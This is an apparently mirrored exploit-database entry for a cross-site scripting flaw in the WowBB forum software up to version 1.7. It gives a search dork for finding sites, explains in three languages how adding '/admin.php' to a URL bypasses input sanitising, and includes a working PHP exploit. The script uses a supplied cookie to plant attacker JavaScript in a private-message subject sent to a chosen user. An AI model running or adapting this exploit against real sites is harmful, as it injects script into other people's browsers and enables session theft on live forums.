@@ -1,0 +1,140 @@
+id: 12699
+date: 06/14/2010
+title: WowBB <= 1.7 XSS Vulnerabilities
+author: Lord-Anubis
+cves: 
+
+================================
+WowBB <= 1.7 XSS Vulnerabilities
+================================
+
+
++-------------------------------------------------------------------------------------------------------------------------------+
+|				 _______         __                ______     							|
+|				|    |  |.--.--.|  |--..-----.    |      |.----..-----..--.--.--.				|
+|				|       ||  |  ||    < |  -__|    |   ---||   _||  -__||  |  |  |				|
+|				|__|____||_____||__|__||_____|    |______||__|  |_____||________|				|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Name: WowBB <= 1.7 XSS													|
+| Software: WowBB <= 1.7													|
+| Site: http://www.wowbb.com/													|
+| Download: WowBB is NOT free.													|
+| Vulnerability: Cross Site Scripting												|
+| Severity: medium ( low / medium / high )											|
+| Tested on: 1.7														|
+| Dork: "Powered by WowBB"													|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Author: Lord-Anubis														|
+| Contact: lord.anu bis4[at]gm ail[dot]com											|
+| Date: 15.06.2010 ( dd.mm.yyyy )												|
+| Site: http://lordanubis.altervista.org/											|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug File: lib.php														|
+| 587.	if ((strpos($HTTP_SERVER_VARS["PHP_SELF"], "admin.php") === false) and ($xss_protect) and (key($a) != "message"))	|
+| 588.		$a[key($a)] = htmlspecialchars(current($a));									|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug Explanation:														|
+|	- EN:	In file lib.php the superglobal array POST/GET is santize by function array_addslashes(). This function uses	|
+|		addslashes() if magic_quotes_gpc is enabled in php.ini and uses htmlspecialchars() if user doesn't navigate in	|
+|		file admin.php. Bug is exploitable when is inserted the string "admin.php" on url. This example is not usable,	|
+|		but is need to understand:											|
+|		1) http://www.[site].com/[path]/index.php?var=<script>alert(1)</script> <--- is santize				|
+|		2) http://www.[site].com/[path]/index.php/admin.php?var=<script>alert(1)</script> <--- is NOT santize		|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- ITA: 	Nel file lib.php le array superglobali POST/GET vengono purificate dalla funzione array_addslashes(), che	|
+|		utilizza addslashes() se magic_quotes_gpc Ð¸ settato a 1 nel file php.ini e utilizza htmlspecialchars() se	|
+|		l'utente NON si trova nel file admin.php. E' possibile sfruttare il bug facendo credere all'applicazione di	|
+|		trovarci nel pannello amministrativo e di conseguenza inniettare codice javascript senza che esso venga		|
+|		purificato. Un esempio che non Ð¸ attuabile, ma che rende l'idea, Ð¸:						|
+|		1) http://www.[site].com/[path]/index.php?var=<script>alert(1)</script> <--- viene purificata			|
+|		2) http://www.[site].com/[path]/index.php/admin.php?var=<script>alert(1)</script> <--- NON viene purificata	|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- PL:	W pliku lib.php super globalne array POST/GET jest czyszczone przez funkcje array_addslashes(), ta funkcja	|
+|		uzywa addslashes() kiedy magic_quotes_gpc jest ustawiony na 1 w pliku php.ini, i uzywa htmlspecialchars() kiedy	|
+|		uzyktownik nie jest w panelu administracynjnym. Wpisujac admin.php w url mozna udac, ze sie znajduje w panelu 	|
+|		administacyjnym i wprowadzajac cod javascript. Ten przyklad nie yest wykonalny, ale pomaga to zrozumiec:	|
+|		1) http://www.[site].com/[path]/index.php?var=<script>alert(1)</script> <--- yest czyszczona			|
+|		2) http://www.[site].com/[path]/index.php/admin.php?var=<script>alert(1)</script> <--- NIE yest czyszczona	|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Exploit:															|
++-------------------------------------------------------------------------------------------------------------------------------+
+<?php
+/**
+ * exploit.php
+ *
+ * Software: WowBB <= 1.7
+ * Author: Lord-Anubis <lord.anu bis4[at]gm ail[dot]com>
+ * Vulnerability: Cross Site Scripting
+ */
+
+//
+error_reporting(0);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+//
+function sendPacket($packet) {
+	global $hostName;
+    if (!$sock = fsockopen(gethostbyname($hostName), 80)) {
+		exit("[-] No response from '{$hostName}'\n");
+	}
+
+	fputs($sock, $packet);
+	while (!feof($sock)) {
+		$html .= fgets($sock);
+    }
+	
+	fclose($sock);
+	return $html;
+}
+
+//
+if ($argc < 5) {
+	exit(
+		"[+] Software: WowBB <= 1.7\n".
+		"[+] Author: Lord-Anubis\n".
+		"[+] Vulnerability: Cross Site Scripting\n".
+		"[+] Usage: ./exploit [hostName] [path] [evilUserName] [yourCookie] [Code]\n".
+		"[+] Example:\n".
+		"[+] ./exploit 127.0.0.1 / admin anubis%7C%7C9f55c7e99c128fb18b0ce725a8c2bdea <script>[...]</script>\n".
+		"[+] ./exploit hostname.com /wowbb/ mod mark%7C%7Cea82410c7a9991816b5eeeebe195e20a <h1>lol</h1>\n"
+	);
+}
+
+//
+$hostName = $argv[1];
+$path	  = $argv[2];
+$userName = $argv[3];
+$cookie	  = $argv[4];
+$evilCode = $argv[5];
+
+//
+if (count(explode("%7C", $cookie)) < 3) {
+	exit("[-] Your cookie is invalid\n");
+}
+
+//
+$postData = "message=Hello_Bro&spell_check=&preview_pm=&post_pm=1&pm_to=$userName&pm_subject=$evilCode";
+$packet   = "POST http://{$hostName}{$path}pm.php/admin.php HTTP/1.1\r\n";
+$packet  .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet  .= "Host: {$hostName}\r\n";
+$packet  .= "Content-Length: ".strlen($postData)."\r\n";
+$packet  .= "Cookie: wowbb=$cookie;\r\n\r\n";
+$packet  .= $postData;
+sendPacket($packet);
+
+//
+$packet  ="GET http://{$hostName}{$path}pm.php?folder_id=101 HTTP/1.0\r\n";
+$packet .="Host: {$hostName}\r\n";
+$packet .= "Cookie: wowbb=$cookie;\r\n\r\n";
+$packet .="Connection: Close\r\n\r\n";
+if (preg_match('/<a id="link[0-9]+" href="javascript:show_message\([0-9]+\)">'.preg_quote($evilCode, '/').'<\/a>/is', sendPacket($packet))) {
+	exit("[+] Exploit successfull\n");
+} else {
+	exit("[-] Exploit failed\n");
+}
+?>
+
+
+
+#  0day.today [2023-03-25]  #
